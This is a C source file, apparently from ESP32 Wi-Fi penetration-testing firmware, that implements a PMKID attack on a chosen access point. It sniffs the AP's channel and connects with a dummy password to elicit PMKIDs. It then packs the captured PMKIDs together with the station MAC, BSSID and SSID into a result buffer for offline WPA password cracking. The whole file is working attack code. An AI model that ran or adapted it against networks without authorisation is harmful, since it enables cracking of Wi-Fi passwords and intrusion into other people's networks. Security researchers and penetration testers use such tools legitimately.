/**
 * @file attack_pmkid.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements PMKID attack.
 *
 * @date Update 2023-05-07
 * @note Updated by Zheng Lin Lei
 * @note Github: https://github.com/ZhengLinLei
 * 
 * @see PMKID attack reference - https://hashcat.net/forum/thread-7717.html
 */

#include "attack_pmkid.h"

#include <stdlib.h>
#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"

#include "attack.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"

static const char* TAG = "main:attack_pmkid";
static const wifi_ap_record_t *ap_record = NULL;

/**
 * @brief Callback for DATA_FRAME_EVENT_PMKID event.
 * 
 * If DATA_FRAME_EVENT_PMKID is received from event pool, this function stops PMKID attack and serialize 
 * captured PMKIDs into status content.
 * 
 * @param args not used
 * @param event_base expects FRAME_ANALYZER_EVENTS
 * @param event_id expects DATA_FRAME_EVENT_PMKID
 * @param event_data expexcts pmkid_item_t *
 */
static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGD(TAG, "Got PMKID, stopping attack...");
    attack_update_status(FINISHED);
    attack_pmkid_stop();
    
    pmkid_item_t *pmkid_item_head = *(pmkid_item_t **) event_data;
    if (pmkid_item_head == NULL) {
        ESP_LOGW(TAG, "PMKID event without any item");
        return;
    }

    /* Count nodes first; the list is built with head insertion. */
    unsigned pmkid_item_count = 0;
    for (pmkid_item_t *item = pmkid_item_head; item != NULL; item = item->next) {
        pmkid_item_count++;
    }

    // MAC_STA + MAC_AP + SSID size + SSID + PMKID * count
    char *content = attack_alloc_result_content(6 + 6 + 1 + strlen((char *) ap_record->ssid) + (pmkid_item_count * 16));
    if (content == NULL) {
        /* free the list so the items do not leak when allocation failed */
        pmkid_item_t *item = pmkid_item_head;
        while (item != NULL) {
            pmkid_item_t *next = item->next;
            free(item);
            item = next;
        }
        return;
    }
    wifictl_get_sta_mac((uint8_t *) content);
    content += 6;
    memcpy(content, ap_record->bssid, 6);
    content += 6;
    content[0] = strlen((char *) ap_record->ssid);
    content += 1;
    strcpy(content, (char *) ap_record->ssid);
    content += strlen((char *) ap_record->ssid);

    // copy PMKIDs into continuous memory into "content" in status, freeing as we go
    pmkid_item_t *item = pmkid_item_head;
    while (item != NULL) {
        pmkid_item_t *next = item->next;
        memcpy(content, item->pmkid, 16);
        content += 16;
        free(item);
        item = next;
    }

    ESP_LOGD(TAG, "PMKID attack finished");
}

void attack_pmkid_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting PMKID attack...");
    ap_record = attack_config->ap_record;
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
    wifictl_sta_connect_to_ap(ap_record, "dummypassword");
    ESP_ERROR_CHECK(esp_event_handler_register_with(wifictl_sniffer_event_loop(), FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler, NULL));
}

void attack_pmkid_stop(){
    wifictl_sta_disconnect();
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister_with(wifictl_sniffer_event_loop(), FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler));
    ESP_LOGD(TAG, "PMKID attack stopped");
}